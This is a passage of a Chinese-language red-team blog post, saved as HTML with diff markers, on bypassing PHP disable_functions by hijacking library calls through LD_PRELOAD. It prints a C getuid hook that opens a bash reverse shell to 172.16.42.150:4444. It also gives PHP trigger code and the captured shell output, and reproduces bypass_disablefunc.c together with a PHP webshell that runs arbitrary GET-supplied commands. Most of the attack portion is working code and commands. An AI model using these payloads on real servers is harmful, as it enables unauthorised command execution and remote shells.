[<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/usr/sbin/sendmail -t -i d&quot;</span>], <span class="number">0x561cadfe0e70</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19699</span>] brk(<span class="symbol">NULL</span>)                   = <span class="number">0x562b89290000</span></span><br><span class="line">[pid <span class="number">19699</span>] access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, <span class="symbol">R_OK</span>) = <span class="number">-1</span> <span class="symbol">ENOENT</span> (没有那个文件或目录)</span><br><span class="line">--</span><br><span class="line">[pid <span class="number">19699</span>] wait4(<span class="number">-1</span>, strace: <span class="symbol">Process</span> <span class="number">19700</span> attached</span><br><span class="line"> &lt;unfinished ...&gt;</span><br><span class="line">[pid <span class="number">19700</span>] execve(<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, [<span class="string">&quot;/usr/sbin/sendmail&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="string">&quot;d&quot;</span>], <span class="number">0x562b89290908</span> <span class="comment">/* 28 vars */</span>) = <span class="number">0</span></span><br><span class="line">[pid <span class="number">19700</span>] access(<span class="string">&quot;/etc/suid-debug&quot;</span>, <span class="symbol">F_OK</span>) = <span class="number">-1</span> <span class="symbol">ENOENT</span> (没有那个文件或目录)</span><br><span class="line">[pid <span class="number">19700</span>] brk(<span class="symbol">NULL</span>)                   = <span class="number">0x560c224de000</span></span><br></pre></td></tr></table></figure>
+
+<p>mail() 内部启动了 /usr/sbin/sendmail进程，至此我们已经发现了启动新进程的php函数。</p>
+<h3 id="5-2-找到php函数调用的库函数"><a href="#5-2-找到php函数调用的库函数" class="headerlink" title="5.2 找到php函数调用的库函数"></a>5.2 找到php函数调用的库函数</h3><p><code>readelf -Ws /usr/sbin/sendmail</code>查看调用哪些库函数</p>
+<p>择劫持那些无参数且常用的系统函数，getuid() 就适合</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln html]# readelf -Ws <span class="regexp">/usr/</span>sbin/sendmail | <span class="keyword">grep</span> getuid</span><br><span class="line">    <span class="number">64</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL <span class="keyword">DEFAULT</span>  UND getuid@GLIBC_2.<span class="number">2.5</span> (<span class="number">2</span>)</span><br><span class="line">You have <span class="keyword">new</span> mail.</span><br></pre></td></tr></table></figure>
+
+<p>查看用法</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">man</span> <span class="number">2</span> getuid</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">       <span class="function"><span class="keyword">uid_t</span> <span class="title">geteuid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>劫持代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.16.42.150/4444 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-3-用LD-PRELOAD劫持库函数的调用"><a href="#5-3-用LD-PRELOAD劫持库函数的调用" class="headerlink" title="5.3 用LD_PRELOAD劫持库函数的调用"></a>5.3 用LD_PRELOAD劫持库函数的调用</h3><p>执行命令编译生成 hook_getuid.so：</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln html]<span class="comment"># touch hook_getuid.so</span></span><br><span class="line">[root@vuln html]<span class="comment"># rm hook_getuid.so</span></span><br><span class="line">[root@vuln html]<span class="comment"># touch hook_getuid.c</span></span><br><span class="line">[root@vuln html]<span class="comment"># vim hook_getuid.c</span></span><br><span class="line">[root@vuln html]<span class="comment"># gcc -shared -fPIC hook_getuid.c -o hook_getuid.so</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在 PHP 环境下劫持系统函数 getuid 就行了，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/hook_getuid.so&quot;</span>);</span><br><span class="line">    mail(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问触发</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS <span class="regexp">/tmp]$ curl http:/</span><span class="regexp">/172.16.42.151/m</span>ail.php</span><br></pre></td></tr></table></figure>
+
+<p>收到shell</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@debian</span> ~]<span class="comment"># nc -lvvp 4444</span></span><br><span class="line">listening on [any] <span class="number">4444</span> ...</span><br><span class="line"><span class="number">172.16</span>.<span class="number">42.151</span>: inverse host lookup <span class="symbol">failed:</span> Unknown host</span><br><span class="line">connect to [<span class="number">172.16</span>.<span class="number">42.150</span>] from (UNKNOWN) [<span class="number">172.16</span>.<span class="number">42.151</span>] <span class="number">41994</span></span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">16416</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data<span class="variable">@vuln</span><span class="symbol">:/var/www/html</span>$</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>error_log()</strong></p>
+<p><code>error_log</code> 与 <code>mail</code> 函数的原理一样，都会启动一个新的系统进程 <code>/usr/sbin/sendmail</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/tmp/hook_getuid.so&quot;</span>);    <span class="comment">// 注意这里的目录要有访问权限</span></span><br><span class="line">error_log(<span class="string">&quot;&quot;</span>, <span class="number">1</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不再赘述。</p>
+<h3 id="5-4-利用-LD-PRELOAD-劫持系统新进程来绕过"><a href="#5-4-利用-LD-PRELOAD-劫持系统新进程来绕过" class="headerlink" title="5.4 利用 LD_PRELOAD 劫持系统新进程来绕过"></a>5.4 利用 LD_PRELOAD 劫持系统新进程来绕过</h3><p>在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1   lamp、lamp.、lamp.com）。基于这两个原因，我不得不放弃劫持函数 getuid()，必须找个更普适的方法。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！几经搜索后了解到，GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <strong>attribute</strong>((constructor)) 修饰的函数。</p>
+<p>如下，我们可以直接劫持系统命令 <code>ls</code>：</p>
+<ul>
+<li>hook_ls.c</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译并测试 <code>ls</code> 命令：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># touch hook_ls.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># vim hook_ls.c</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># gcc -shared -fPIC hook_ls.c -o hook_ls.so</span></span><br><span class="line">[root@vuln <span class="string">/tmp</span>]<span class="comment"># LD_PRELOAD=/tmp/hook_ls.so ls</span></span><br><span class="line">uid=0<span class="params">(root)</span> gid=0<span class="params">(root)</span> 组=0<span class="params">(root)</span></span><br><span class="line">hook_<span class="keyword">ls</span>.c   hook_strcmp.c   hook_strncmp.c   passcheck    systemd-private-a83e169502574670adf290d48faa3b1e-apache2.service-0ngAZl</span><br><span class="line">hook_<span class="keyword">ls</span>.so  hook_strcmp.so  hook_strncmp.so  passcheck.c</span><br></pre></td></tr></table></figure>
+
+<p>如上图，成功劫持，并且不光劫持了 <code>ls</code>，只要启动了进程便会进行劫持。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu">yangyangwithgnu</a> 师傅根据这个思路创建了 <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">bypass_disablefunc_via_LD_PRELOAD </a>这个项目，项目中有这几个关键文件：</p>
+<ul>
+<li>bypass_disablefunc.php：一个用来执行命令的 webshell。</li>
+<li>bypass_disablefunc_x64.so 或 bypass_disablefunc_x86.so：用来加载并执行命令的动态链接库文件，分为 64 位的和 32 位的。</li>
+<li>bypass_disablefunc.c：用来编译生成上面的动态链接库文件。</li>
+</ul>
+<p>bypass_disablefunc.c的源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>bypass_disablefunc.php 的源码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);    // 通过环境变量 EVIL_CMDLINE 向 bypass_disablefunc_x64.so 传递具体执行的命令行信息</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">	// error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对于 bypass_disablefunc.php，权限上传到 Web 目录的直接访问，无权限的话可以传到 tmp 目录后用include 等函数来包含，并且需要用 GET 方法提供三个参数：</p>
+<p>且需要用 GET 方法提供三个参数：</p>
+<ul>
+<li>cmd 参数：待执行的系统命令，如 id 命令。</li>
+<li>outpath 参数：保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点。</li>
+<li>sopath 参数：指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。</li>
+</ul>
+<p>可以看到，bypass_disablefunc.php 的源码也使用了 mail() 函数，但是无需安装 sendmail，只需要 PHP 支持 putenv()、mail() 即可。如果 mail() 函数也被禁用了，那我们可以在寻找其他可以启动新进程的函数即可，比如 error_log() 等。</p>
+<p>使用时，我们想办法将 bypass_disablefunc.php 和 bypass_disablefunc_x64.so 传到目标<strong>有权限</strong>的目录中：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">root@vuln html</span>]<span class="meta"># pwd</span></span><br><span class="line">/<span class="keyword">var</span>/www/html</span><br><span class="line">[<span class="meta">root@vuln html</span>]<span class="meta"># ls</span></span><br><span class="line">bypass_disablefunc.php  bypass_disablefunc_x64.so</span><br><span class="line">[<span class="meta">root@vuln html</span>]<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p>然后将bypass_disablefunc.php包含进来并使用GET方法提供所需的三个参数：</p>
+<p>浏览器访问:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.16</span>.<span class="number">42.151</span><span class="regexp">/bypass_disablefunc.php?cmd=ls&amp;outpath=/</span>var<span class="regexp">/tmp/</span>xxxx&amp;sopath=<span class="regexp">/var/</span>www<span class="regexp">/html/</span>bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/pic/ld_preload.jpg"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/">https://whoamianony.top/2021/10/22/Web%E5%AE%89%E5%85%A8/%E6%9C%89%E8%B6%A3%E7%9A%84%20LD_PRELOAD/</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E5%AE%89%E5%85%A8/" rel="tag"># Linux安全</a>
+              <a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" rel="tag"># 红队技术</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Java-ASM/" rel="prev" title="Java ASM">
+      <i class="fa fa-chevron-left"></i> Java ASM
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/linux%E4%B8%8B%E8%BD%BD%E8%BF%9C%E7%A8%8B%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/" rel="next" title="linux下载远程恶意文件">
+      linux下载远程恶意文件 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E9%93%BE%E6%8E%A5"><span class="nav-text">1. 链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-LD-PRELOAD"><span class="nav-text">2. LD_PRELOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-LD-PRELOAD-Hook"><span class="nav-text">3. LD_PRELOAD Hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%88%B6%E4%BD%9C%E5%90%8E%E9%97%A8"><span class="nav-text">4. 制作后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E7%BB%95%E8%BF%87-Disable-Functions"><span class="nav-text">5. 绕过 Disable_Functions</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E5%90%AF%E5%8A%A8%E6%96%B0%E8%BF%9B%E7%A8%8B%E7%9A%84php%E5%87%BD%E6%95%B0"><span class="nav-text">5.1 启动新进程的php函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E6%89%BE%E5%88%B0php%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%BA%93%E5%87%BD%E6%95%B0"><span class="nav-text">5.2 找到php函数调用的库函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E7%94%A8LD-PRELOAD%E5%8A%AB%E6%8C%81%E5%BA%93%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8"><span class="nav-text">5.3 用LD_PRELOAD劫持库函数的调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E5%88%A9%E7%94%A8-LD-PRELOAD-%E5%8A%AB%E6%8C%81%E7%B3%BB%E7%BB%9F%E6%96%B0%E8%BF%9B%E7%A8%8B%E6%9D%A5%E7%BB%95%E8%BF%87"><span class="nav-text">5.4 利用 LD_PRELOAD 劫持系统新进程来绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ShadowFl0w"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">ShadowFl0w</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ShadowFl0w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ShadowFl0w" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ShadowFl0w</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
